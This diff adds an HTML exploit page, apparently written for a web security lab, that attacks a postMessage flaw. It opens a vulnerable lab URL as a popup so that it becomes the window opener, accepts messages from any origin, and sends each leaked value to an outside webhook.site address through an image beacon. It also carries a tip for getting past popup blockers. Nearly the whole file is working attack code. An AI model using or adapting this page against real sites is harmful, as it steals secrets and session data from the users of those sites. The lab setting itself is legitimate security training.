@@ -1,0 +1,46 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>postMessage exfil (opener)</title>
+  <meta name="referrer" content="no-referrer">
+</head>
+<body>
+<script>
+  // ====== CONFIG ======
+  const VULN_URL = 'http://ptl-2e3a9981-87f3f2e9.libcurl.so/key/0';          // <- your lab URL
+  const WEBHOOK_URL = 'https://webhook.site/86e25969-9ba2-40c5-84e3-3fe5792c610b';   // <- your webhook URL
+
+  // Open the vulnerable page as a popup so WE become window.opener.
+  // Tip: attach a user gesture (click) when testing to bypass popup blockers.
+  const child = window.open(VULN_URL, '_blank', 'noopener=false');
+
+  // Receive secrets the vulnerable page leaks via postMessage.
+  window.addEventListener('message', function (evt) {
+    try {
+      // In the lab the bug is "no targetOrigin" — we accept all.
+      // If you want to restrict, inspect evt.origin.
+      const data = typeof evt.data === 'string' ? evt.data : JSON.stringify(evt.data);
+
+      // Exfil via <img> beacon (CORS-proof).
+      const i = new Image();
+      i.src = WEBHOOK_URL + '?leak=' + encodeURIComponent(data) + '&ts=' + Date.now();
+
+      // Debug in console as well:
+      console.log('[LEAK]', evt.origin, data);
+    } catch (e) {
+      console.log('handler error:', e);
+    }
+  }, false);
+</script>
+
+<h1>Arming opener…</h1>
+<p>If popup blocked, click: <a href="#" id="go">Open target</a></p>
+<script>
+  document.getElementById('go').addEventListener('click', (e) => {
+    e.preventDefault();
+    window.open(VULN_URL, '_blank', 'noopener=false');
+  });
+</script>
+</body>
+</html>
